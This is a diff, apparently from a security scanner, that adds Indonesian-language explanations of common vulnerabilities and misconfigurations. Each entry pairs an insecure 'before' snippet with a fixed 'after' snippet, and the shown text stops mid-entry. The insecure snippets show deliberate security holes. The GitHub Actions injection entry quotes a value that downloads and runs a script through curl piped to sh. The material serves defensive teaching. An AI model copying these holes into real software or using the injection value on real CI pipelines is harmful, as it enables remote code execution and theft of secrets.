+  "hardcoded-secret": {
+    title: "Ada kata sandi atau kunci rahasia yang ditulis langsung di kode",
+    description:
+      "Kunci API, token, atau kata sandi tampak ditulis sebagai nilai literal, bukan dibaca dari variabel lingkungan. Siapa pun yang membaca kode sumber (atau repositori, jika publik) mendapatkan rahasia tersebut.",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "File dengan kata sandi asli proyek termasuk di antara yang dianalisis",
+    description:
+      "File .env dengan nilai asli (bukan .env.example) disertakan dalam analisis. Jika file ini berakhir di repositori atau deployment publik, semua kredensial yang dikandungnya terekspos.",
+    fix: {
+      before: `# .env (ter-commit karena kesalahan)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (ter-commit)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env tetap di luar repo (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "Siapa pun bisa membaca atau mengubah data semua pengguna",
+    description:
+      "Row Level Security dinonaktifkan, atau sebuah policy mengizinkan akses untuk siapa saja (USING (true)) tanpa memeriksa siapa yang membuat permintaan. Setiap pengguna terautentikasi — atau bahkan anonim — bisa membaca atau mengubah data semua orang lain.",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "Nilai yang dimasukkan pengguna ditempelkan langsung ke dalam query database",
+    description:
+      "Query SQL dibuat dengan menggabungkan atau menyisipkan string secara langsung, bukan menggunakan parameter. Jika teks itu berasal (bahkan secara tidak langsung) dari pengguna, ia bisa mengubah query itu sendiri — SQL injection.",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "Kata sandi tampaknya tidak dilindungi",
+    description:
+      "Kolom kata sandi disimpan persis seperti saat tiba dari permintaan, dan tidak ada fungsi hashing (bcrypt, argon2, scrypt) yang muncul di file. Jika database diretas, semua kata sandi langsung bisa digunakan.",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "Secret yang digunakan untuk menandatangani login ditulis dalam teks biasa di kode",
+    description:
+      "Secret yang diberikan ke jwt.sign / jwt.verify (atau variabel JWT_SECRET) adalah nilai literal di kode, bukan berasal dari variabel lingkungan. Siapa pun yang membacanya bisa membuat token akses yang valid untuk pengguna mana pun.",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "Server bisa dipaksa menjalankan perintah eksternal",
+    description:
+      "Fungsi yang menjalankan perintah sistem (exec, execSync, spawn) menerima string yang dibangun melalui interpolasi atau penggabungan. Jika sebagian string itu berasal dari input pengguna, siapa pun yang mengendalikannya bisa menjalankan perintah arbitrer di server.",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "File di server bisa dibaca atau ditulis dengan memilih path dari luar",
+    description:
+      'Fungsi yang membaca, menulis, atau mengirim file mendapatkan path langsung dari nilai permintaan (query, body, params) tanpa memeriksa apakah tetap berada di dalam folder yang diizinkan. Penyerang bisa menyisipkan "../" untuk keluar dari folder yang dimaksud dan membaca atau menimpa file arbitrer di server (mis. file konfigurasi berisi kredensial).',
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Path tidak diizinkan")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "Nilai yang dimasukkan pengguna dieksekusi sebagai kode di dalam query MongoDB",
+    description:
+      "Operator $where MongoDB menjalankan JavaScript sisi server untuk setiap dokumen — jika string itu dibangun dengan menggabungkan nilai yang berasal dari pengguna, siapa pun yang mengendalikannya bisa menjalankan kode arbitrer dalam konteks database, bukan hanya mengubah filter seperti pada SQL injection biasa.",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "Nilai yang dimasukkan pengguna diinterpretasikan sebagai template, bukan sebagai data",
+    description:
+      "Fungsi yang mengompilasi/menjalankan template menerima SELURUH template dari nilai permintaan, bukan menggunakan template tetap dan hanya meneruskan datanya. Penyerang bisa menulis langsung dalam sintaks mesin template (mis. {{7*7}} untuk Jinja2) dan menjalankan kode di server — Server-Side Template Injection, yang sering berujung pada eksekusi perintah arbitrer, bukan sekadar masalah tampilan seperti XSS.",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "Parser XML bisa dipaksa membaca file atau membuat permintaan eksternal",
+    description:
+      "Parser XML (DocumentBuilderFactory) dibuat tanpa secara eksplisit menonaktifkan entitas eksternal (DOCTYPE), di baris-baris terdekat. Jika parser menerima XML dari sumber yang tidak tepercaya, penyerang bisa mendefinisikan entitas eksternal untuk membaca file di server atau membuatnya menghubungi alamat pilihannya — XML External Entity.",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Rahasia ditulis langsung dalam instruksi ENV atau ARG di Dockerfile",
+    description:
+      "Variabel dengan nama seperti password/secret/token/key memiliki nilai literal dalam instruksi ENV atau ARG. Berbeda dari file .env (yang biasanya tidak berakhir di image), nilai ini tertanam langsung dalam image Docker itu sendiri — siapa pun yang bisa melakukan pull atau memeriksa riwayat layer bisa memulihkannya, bahkan jika barisnya dihapus di versi Dockerfile berikutnya.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# diteruskan dengan: docker build --build-arg DB_PASSWORD=*** (atau, lebih baik lagi,\n# dengan secret mount BuildKit, yang tidak pernah masuk ke riwayat layer)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Sebuah container dalam manifest Kubernetes berjalan sebagai privileged",
+    description:
+      '"privileged: true" dalam securityContext sebuah container menonaktifkan hampir semua isolasi normal antara container dan host: container bisa mengakses perangkat host, mengubah konfigurasi jaringannya, dan dalam banyak kasus secara efektif mendapatkan akses root pada mesin yang menjalankannya. Hampir tidak pernah dibutuhkan untuk aplikasi normal.',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # hanya capability yang benar-benar diperlukan`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Rahasia ditulis dalam teks biasa di variabel env manifest Kubernetes",
+    description:
+      'Variabel lingkungan dengan nama seperti password/secret/token/key memiliki nilai literal ("value:") alih-alih dibaca dari Secret ("valueFrom.secretKeyRef"). Manifest itu sendiri — sering di-commit ke repositori — jadi berisi rahasia dalam teks biasa, terlihat bahkan oleh siapa pun yang hanya bisa membaca konfigurasi, tidak harus menjalankan perintah di cluster.',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Security group Terraform membuka port sensitif ke seluruh internet",
+    description:
+      'Aturan dengan "cidr_blocks" yang mencakup 0.0.0.0/0 (alamat IP mana pun) berada di dekat port sensitif — SSH (22), RDP (3389), atau port database umum (MySQL, Postgres, MongoDB, Redis, SQL Server). Siapa pun di internet bisa mencoba terhubung ke layanan itu, bukan hanya yang seharusnya.',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # hanya jaringan privat Anda, atau sebuah bastion host\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Aturan firewall Google Cloud membuka port sensitif ke seluruh internet",
+    description:
+      'Resource "google_compute_firewall" dengan "source_ranges" yang mencakup 0.0.0.0/0 (alamat IP mana pun) mengizinkan trafik ke port sensitif — SSH (22), RDP (3389), atau port database umum (MySQL, Postgres, MongoDB, Redis, SQL Server). Siapa pun di internet bisa mencoba terhubung ke layanan itu, bukan hanya yang seharusnya.',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # hanya jaringan privat Anda, atau sebuah bastion host\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Aturan jaringan Azure membuka port sensitif ke seluruh internet",
+    description:
+      'Aturan keamanan jaringan ("azurerm_network_security_rule", atau blok "security_rule" di dalam "azurerm_network_security_group") dengan "source_address_prefix" diisi "*" atau "0.0.0.0/0", arah "Inbound" dan akses "Allow", di dekat port sensitif — SSH (22), RDP (3389), atau port database umum. Siapa pun di internet bisa mencoba terhubung ke layanan itu, bukan hanya yang seharusnya.',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # hanya jaringan privat Anda, atau sebuah bastion host\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "Rahasia ditulis sebagai nilai default sebuah variabel Terraform",
+    description:
+      'Variabel dengan nama seperti password/secret/token/key memiliki nilai literal pada "default"-nya. Berbeda dari nilai yang diteruskan saat runtime (tfvars, variabel lingkungan TF_VAR_*), sebuah default berakhir di kode sumber — dan jika repositori dibagikan atau publik, siapa pun bisa melihatnya, bahkan tanpa akses ke state Terraform.',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # tanpa default: harus diteruskan dengan file .tfvars (di luar git) atau variabel lingkungan TF_VAR_db_password\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "Nilai yang dikendalikan pengguna eksternal masuk langsung ke perintah shell CI",
+    description:
+      'Perintah "run:" dalam workflow GitHub Actions langsung menyisipkan nilai seperti judul pull request, nama branch, atau teks komentar — semuanya bisa ditulis oleh siapa pun yang membuka pull request atau komentar, bahkan dari fork eksternal. Nilai seperti `"; curl malware.sh | sh #` akan menjalankan perintah arbitrer di CI, dengan akses ke semua secret yang tersedia di workflow itu.',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # diteruskan sebagai variabel lingkungan, tidak pernah disisipkan langsung ke perintah`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "Workflow menjalankan kode dari pull request eksternal dengan akses ke secret repositori",
+    description:
+      'Workflow menggunakan "pull_request_target" — yang berjalan dengan izin dan secret repositori dasar bahkan untuk pull request yang dibuka dari fork yang tidak terkait — dan melakukan checkout kode dari pull request itu sendiri ("github.event.pull_request.head"), bukan branch dasar. Siapa pun yang membuka pull request itu secara efektif mendapatkan kodenya sendiri dijalankan dengan akses ke secret tersebut.',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Checkout branch dasar, bukan kode PR — atau gunakan\n      # "pull_request" alih-alih "pull_request_target" jika tidak memerlukan\n      # izin/secret yang lebih luas.\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "Data permintaan dideserialisasi dengan format yang bisa mengeksekusi kode",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), atau pustaka node-serialize (Node) sedang mendeserialisasi nilai yang diambil langsung dari permintaan. Berbeda dari JSON, format-format ini bisa merepresentasikan dan mengeksekusi kode selama proses deserialisasi itu sendiri — siapa pun yang mengendalikan nilai yang dikirim bisa mencapai eksekusi kode arbitrer di server.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON tidak pernah mengeksekusi kode saat parsing, berbeda dari pickle`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'Kode secara eksplisit menerima token JWT yang tidak ditandatangani (algoritma "none")',
+    description:
+      '"none" muncul di antara algoritma yang diterima untuk memverifikasi token JWT. Token dengan algoritma "none" tidak memiliki tanda tangan untuk diverifikasi: siapa pun bisa membuatnya dengan konten apa pun (mis. peran admin) dan kode akan menerimanya sebagai valid.',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // jangan pernah menyertakan "none" di antara algoritma yang diterima`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "Sebuah tabel baru tampaknya dibuat tanpa perlindungan",
+    description:
+      "Migrasi SQL membuat sebuah tabel tetapi tidak mengaktifkan Row Level Security untuk tabel itu di file yang sama. Selama tetap seperti ini, tabel itu lahir tanpa pembatasan apa pun atas siapa yang bisa membaca atau menulisnya.",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "Situs menerima permintaan dari situs web lain mana pun",
+    description:
+      "Header CORS diatur untuk menerima permintaan dari origin mana pun (*), atau middleware cors() digunakan tanpa pembatasan. Situs web pihak ketiga mana pun bisa memanggil API Anda dari browser pengguna yang sudah terautentikasi.",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://situsanda.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "Fungsi dengan izin admin tidak memeriksa siapa yang menggunakannya",
+    description:
+      "Rute atau fungsi yang namanya menunjukkan operasi admin tidak mengandung, di baris-baris terdekat, pemeriksaan autentikasi atau peran apa pun. Siapa pun yang mengetahui URL-nya bisa menjalankannya.",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "Situs bisa dipaksa menjalankan kode eksternal",
+    description:
+      "Permintaan HTTP keluar (fetch, axios) langsung menggunakan nilai yang berasal dari permintaan pengguna sebagai URL tujuan. Pengguna jahat bisa membuat server Anda memanggil alamat internal atau arbitrer — Server-Side Request Forgery.",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.layanananda.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL tidak diizinkan")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "Kata sandi dilindungi dengan metode yang kini mudah dibobol",
+    description:
+      "Pada baris yang sama, md5() atau sha1() diterapkan pada nilai yang terkait dengan kata sandi. Algoritma ini terlalu cepat dihitung: penyerang dengan akses ke database bisa mencoba miliaran kata sandi per detik.",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Sebuah container dalam manifest Kubernetes diatur untuk berjalan sebagai root",
+    description:
+      '"runAsUser: 0" atau "runAsNonRoot: false" dalam securityContext secara eksplisit memaksa eksekusi sebagai root di dalam container. Jika penyerang berhasil menjalankan kode di dalam container (mis. dengan mengeksploitasi pustaka yang rentan), menjadi root di dalam container membuat pelarian ke host — atau dampak yang lebih luas — menjadi lebih mudah.',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Sebuah container dalam manifest Kubernetes bisa mendapatkan lebih banyak privilese dari yang dimilikinya semula",
+    description:
+      '"allowPrivilegeEscalation: true" dalam securityContext memungkinkan proses di dalam container mendapatkan lebih banyak privilese daripada proses yang memulainya (mis. melalui binary dengan setuid). Dikombinasikan dengan kerentanan pada aplikasi, ini adalah satu langkah lagi menuju eksekusi kode dengan privilese lebih tinggi dari yang dimaksudkan.',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Sebuah pod dalam manifest Kubernetes berbagi jaringan, proses, atau memori bersama milik host",
+    description:
+      '"hostNetwork", "hostPID", atau "hostIPC" yang diatur ke true mengeluarkan pod dari isolasi normalnya: hostNetwork mengekspos pod ke jaringan host (melewati kebijakan jaringan cluster), hostPID memberinya visibilitas atas semua proses di mesin host, hostIPC memberinya akses ke memori bersama host. Hampir tidak pernah dibutuhkan untuk aplikasi normal — biasanya hanya untuk alat sistem/pemantauan tingkat rendah.',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Block Public Access dinonaktifkan pada bucket S3 yang didefinisikan di Terraform",
+    description:
+      'Satu atau lebih dari empat proteksi "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) diatur ke false. Ini tidak berarti bucket-nya sudah publik, tapi menghilangkan jaring pengaman yang mencegahnya menjadi publik secara tidak sengaja di kemudian hari.',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Policy IAM yang didefinisikan di Terraform memberikan akses penuh",
+    description:
+      'Statement dengan action "*" dan resource "*" memberikan akses penuh ke setiap layanan dan resource AWS — pemeriksaan yang sama dengan yang sudah dilakukan pada state IAM live, di sini dibaca langsung dari kode bahkan sebelum diterapkan. Mungkin dimaksudkan untuk peran darurat, tapi perlu dikonfirmasi: untuk penggunaan sehari-hari, berikan hanya izin yang benar-benar diperlukan.',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::bucket-anda/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "Sebuah bucket Google Cloud Storage dibuat bisa dibaca oleh siapa pun",
+    description:
+      'Resource "google_storage_bucket_iam_member" atau "google_storage_bucket_iam_binding" memberikan peran kepada "allUsers" atau "allAuthenticatedUsers" — yang pertama membuat bucket bisa dibaca oleh siapa pun di internet, bahkan tanpa akun Google; yang kedua oleh siapa pun yang memiliki akun Google apa pun, bukan hanya yang seharusnya memiliki akses.',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:seseorang@example.com"  # hanya yang benar-benar harus memiliki akses, bukan allUsers/allAuthenticatedUsers\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Akses blob publik diaktifkan pada akun penyimpanan Azure",
+    description:
+      '"allow_blob_public_access" diatur ke true pada sebuah "azurerm_storage_account": siapa pun yang mengetahui URL blob/container yang dibuat publik bisa membacanya, tanpa autentikasi apa pun.',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "Sebuah peran IAM Google Cloud memberikan akses penuh (Owner/Editor)",
+    description:
+      'Sebuah "google_project_iam_binding"/"google_project_iam_member" (atau yang setara di tingkat organisasi/folder) menetapkan peran primitif "roles/owner" atau "roles/editor" — akses hampir penuh ke setiap layanan dalam proyek. Mungkin dimaksudkan untuk akun darurat, tapi perlu dikonfirmasi: untuk penggunaan sehari-hari, berikan hanya peran bawaan yang lebih spesifik yang benar-benar diperlukan.',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # hanya peran bawaan yang benar-benar diperlukan, bukan roles/owner\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "Sebuah penetapan peran Azure memberikan akses penuh (Owner)",
+    description:
+      'Sebuah "azurerm_role_assignment" menetapkan peran "Owner" — akses penuh, termasuk kontrol atas izin pengguna lain, di seluruh scope yang ditetapkan (subscription, resource group...). Mungkin dimaksudkan untuk akun darurat, tapi perlu dikonfirmasi: untuk penggunaan sehari-hari, berikan hanya peran yang lebih spesifik yang benar-benar diperlukan (mis. "Contributor" pada satu resource group).',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # hanya peran yang lebih spesifik yang benar-benar diperlukan, bukan Owner di seluruh subscription\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "Token keamanan dihasilkan dengan generator angka acak yang tidak aman",
+    description:
+      "Nilai dengan nama seperti token/session/reset/otp/csrf dihasilkan dengan Math.random() (JS), random.random() (Python), atau rand() (PHP) — generator yang tidak dirancang untuk keamanan, yang urutannya bisa diprediksi. Token yang dihasilkan dengan cara ini bisa ditebak atau direkonstruksi, menggagalkan tujuan keberadaannya (mis. tautan reset kata sandi yang bisa diprediksi siapa pun).",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, bukan Math.random — tidak bisa diprediksi`,
+    },
+  },
+  "ldap-injection": {
+    title: "Filter LDAP dibangun dengan langsung menggabungkan nilai dari permintaan",
+    description:
+      'Baris yang membangun filter LDAP (mis. "(uid=...)") langsung menyertakan nilai yang diambil dari permintaan, tanpa escaping karakter khusus LDAP. Siapa pun yang mengendalikan nilai itu bisa mengubah logika filter — misalnya melewati pemeriksaan autentikasi atau membaca data direktori yang seharusnya tidak dia lihat.',
+    fix: {
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // karakter khusus LDAP harus selalu di-escape sebelum digunakan dalam filter\nclient.search(base, { filter });",
+    },
+  },
+  "xss-dangerous-html": {
+    title: "Teks yang ditulis pengguna bisa menjalankan kode di browser",
+    description:
+      "Konten dimasukkan ke halaman sebagai HTML mentah (dangerouslySetInnerHTML, v-html, .innerHTML) alih-alih sebagai teks biasa. Jika konten itu mencakup input pengguna, ia bisa berisi skrip yang berjalan di browser siapa pun yang membaca halaman tersebut.",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// atau, jika memerlukan HTML: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "Ruang untuk file yang diunggah terlihat oleh siapa pun",
+    description:
+      "Bucket penyimpanan (Supabase Storage, S3) dikonfigurasi sebagai publik. Jika berisi dokumen, foto, atau file yang diunggah pengguna, siapa pun yang mengetahui — atau menebak — path-nya bisa mengaksesnya tanpa autentikasi.",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// sajikan file dengan URL bertanda tangan berbatas waktu: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "Cukup satu tautan untuk menghapus atau mengubah data",
+    description:
+      "Rute GET melakukan operasi yang mengubah data (path-nya mengandung delete/remove/update/edit). Permintaan GET berjalan hanya dengan mengunjungi tautan atau memuat gambar dari situs eksternal — titik tumpu klasik untuk serangan CSRF.",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "Data login yang disimpan di browser tidak terlindungi dengan baik",
+    description:
+      "Token akses disimpan di localStorage. Berbeda dari cookie httpOnly, skrip apa pun yang berjalan di halaman (termasuk skrip jahat yang disuntikkan lewat XSS) bisa membaca dan mencurinya.",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// atur token sebagai cookie httpOnly dari server:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "Situs bisa digunakan untuk mengarahkan ke situs penipuan",
+    description:
+      "Situs mengarahkan pengguna ke alamat yang diambil langsung dari permintaan (query, body, params) tanpa memeriksa apakah itu domain yang dikenal. Tautan yang tampak menuju ke situs Anda bisa sebenarnya mengarah ke halaman phishing.",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "Mengubah sebuah angka di alamat bisa menampilkan data orang lain",
+    description:
+      "Query database langsung menggunakan identifier yang diambil dari URL (req.params.id) tanpa memverifikasi, di baris-baris terdekat, bahwa itu milik pengguna yang membuat permintaan. Mengubah id di alamat bisa memberikan akses ke data pengguna lain — Insecure Direct Object Reference.",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "Formulir login tidak memblokir terlalu banyak percobaan berturut-turut",
+    description:
+      "Rute login didefinisikan dalam file, tapi tidak ada jejak middleware rate-limiting di file yang sama. Tanpa batas percobaan, penyerang bisa mencoba kata sandi secara berurutan (brute force) tanpa diperlambat.",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "Kata sandi atau data sensitif berakhir di log",
+    description:
+      "Pemanggilan console.log (atau sejenisnya) menyertakan variabel bernama password, token, secret, atau apiKey. Jika log ini berakhir di layanan eksternal atau file, data sensitif tetap terekspos jauh lebih lama dari yang diperlukan.",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "header-injection": {
+    title: "Nilai dari permintaan berakhir langsung di header HTTP respons",
+    description:
+      "Header HTTP respons diatur dengan nilai yang diambil langsung dari permintaan (query, body, params), tanpa memeriksa apakah mengandung baris baru (CRLF). Penyerang bisa menyisipkan header tambahan atau bahkan seluruh respons yang berbeda — response splitting — yang berpotensi memanipulasi cache, cookie, atau konten yang ditampilkan ke pengguna lain.",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "Sebuah action pihak ketiga di CI tidak dikunci ke versi yang presisi (commit SHA)",
+    description:
